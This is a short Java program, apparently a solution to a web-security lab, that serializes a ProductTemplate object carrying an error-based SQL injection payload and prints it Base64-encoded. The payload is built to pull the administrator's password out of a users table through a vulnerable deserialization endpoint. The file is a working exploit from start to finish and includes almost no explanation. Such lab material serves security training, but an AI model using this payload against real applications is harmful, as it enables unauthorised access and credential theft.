import data.productcatalog.ProductTemplate;
import lab.actions.common.serializable.AccessTokenUser;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        ProductTemplate productTemplate = new ProductTemplate("' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int) --");
        String serializedObject = serialize(productTemplate);

        System.out.println("Serialized object: " + serializedObject);

//        ProductTemplate deserializedObject = deserialize(serializedObject);
//        System.out.println("Deserialized data str: " + deserializedObject + ", num: " + deserializedObject);
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }

    private static <T> T deserialize(String base64SerializedObj) throws Exception {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(base64SerializedObj)))) {
            @SuppressWarnings("unchecked")
            T obj = (T) in.readObject();
            return obj;
        }
    }
}
